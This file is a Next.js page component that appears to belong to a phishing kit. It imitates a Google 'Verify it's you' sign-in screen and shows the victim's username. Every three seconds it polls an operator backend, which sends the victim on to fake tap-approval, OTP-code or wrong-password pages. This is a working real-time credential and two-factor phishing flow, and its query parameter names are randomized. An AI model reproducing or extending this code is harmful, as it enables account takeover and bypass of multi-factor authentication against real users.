'use client';

import { useSearchParams } from 'next/navigation';
import { useEffect } from 'react';
import { decodeBase64 } from '@/lib/utils';
import SearchParamsWrapper from '../../components/SearchParamsWrapper';
import { notFound } from 'next/navigation';
import '../../public/styles/codeload.css'; 
function CodeloadPageContent() {
  const searchParams = useSearchParams();
  // Get the first query parameter value (regardless of key name)
  const user = Array.from(searchParams.values())[0];

  useEffect(() => {
    if (!user) {
       notFound();
    }

    // Load the fetch script functionality
    const checkForUpdates = async () => {
      try {
        const randomParam = [...Array(12)].map(() => Math.random().toString(36)[2]).join('');
        const response = await fetch(`/api/codeload-fetch?${randomParam}=${user}`);       
        const data = await response.json();
        if (data.results && data.results.length > 0) {
          const code = data.results[0];
          const username = code.username;
          const a = code.pagetype;
          const num = parseInt(a, 10);
          const b = code.mobiletype;  
  
          // FOR TAP URL CREATE
          const string = `${randomParam}/${username}/${a}/${b}/${randomParam}`;
          const encodedstring = btoa(string);
          const newurltap = `/codetap?${randomParam}=${encodedstring}`;

          // FOR TAP YES URL CREATE
          const yesString = `${randomParam}/${username}/${a}/${b}/${randomParam}`;
          const yesEncodedstring = btoa(yesString);
          const yesurl = `/yestap?${randomParam}=${yesEncodedstring}`;

          // FOR CODE URL CREATE
          const nstring = `${randomParam}/${username}/${b}/${randomParam}`;
          const encodenstring = btoa(nstring);
          const otpurl = `/codeotp?${randomParam}=${encodenstring}`;

          // FOR WRONG PWD URL CREATE
          const wrngString = `${randomParam}/${username}/${b}/${randomParam}`;
          const wrngEncodedstring = btoa(wrngString);
          const wrngurl = `/wrongpwd?${randomParam}=${wrngEncodedstring}`;

          if (a === b) {
            // Continue checking
            return;
          }

          if (Number.isInteger(num) && num > 0) {
            window.location.href = newurltap;
            return;
          }

          if (a.match(/^[mM]$/)) {
            window.location.href = otpurl;
            return;
          }

          if (a.match(/^[wW]$/)) {
            window.location.href = wrngurl;
            return;
          }

          if (a.match(/^[yY]$/)) {
            window.location.href = yesurl;
            return;
          }
        }
      } catch (error) {
        console.error('Error in Fetch request:', error);
      }
    };

    // Start checking for updates every 3 seconds
    const interval = setInterval(checkForUpdates, 3000);

    return () => clearInterval(interval);
  }, [user]);

  if (!user) {
    return null;
  }

  const username = decodeBase64(user);

  return (
  <>
        <div className="maindiv-wrapper">
          <div className="loading-bar"></div>
        </div>
        <div className="maindiv">
          <div className="form-half">
            <div>
              <img className="divlogo" src="/images/image.png" alt="Logo" />
            </div>
            <div>
              <span className="welcome">Verify it&apos;s you</span>
            </div>
            <div className="userdiv">
              <img className="user-icon" src="/images/user-circle.png" alt="User Icon" />
              <span style={{ color: '#2c2a2a', fontSize: '18px', fontFamily: 'Arial, Helvetica, sans-serif' }}>
                {username}
              </span>
              <img className="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon" />
            </div>
          </div>

          <div className="form-half1">
            <div className="session-expired-message">
              <p></p>
            </div>

            <div className="passdiv">
              <input
                name="password"
                type="password"
                id="pEyar"
                value="hdshfsfoieoifhds"
                placeholder=""
                className="focused"
                readOnly
              />
              <label htmlFor="pEyar" className="placeholder-label">
                Enter Your Password
              </label>
            </div>

            <div id="togglePassword" className="shwpwd">
              <input type="checkbox" className="checkbox" />
              <span className="button">Show password</span>
            </div>

            <div className="fgtpwd">
              <button
                type="button"
                className="hyperl"
                onClick={() => (window.location.href = 'https://mail.google.com')}
              >
                Forgot password?
              </button>
              &nbsp;&nbsp;&nbsp;
              <button type="submit" className="btnnxt">
                Next
              </button>
            </div>
          </div>
        </div>

        <div className="btmdiv">
          <div className="left-div">
            <select className="btmhypl" id="language-select">
              <option value="en">English (United States)</option>
              <option value="fr">French</option>
              <option value="es">Spanish</option>
              <option value="de">German</option>
            </select>
          </div>

          <div className="right-divs">
            <div className="right-div">
              <button className="btmhypl">Help</button>
            </div>
            <div className="right-div">
              <button className="btmhypl">Privacy</button>
            </div>
            <div className="right-div">
              <button className="btmhypl">Terms</button>
            </div>
          </div>
        </div>
  </>
  );
}

export default function CodeloadPage() {
  return (
    <SearchParamsWrapper>
      <CodeloadPageContent />
    </SearchParamsWrapper>
  );
}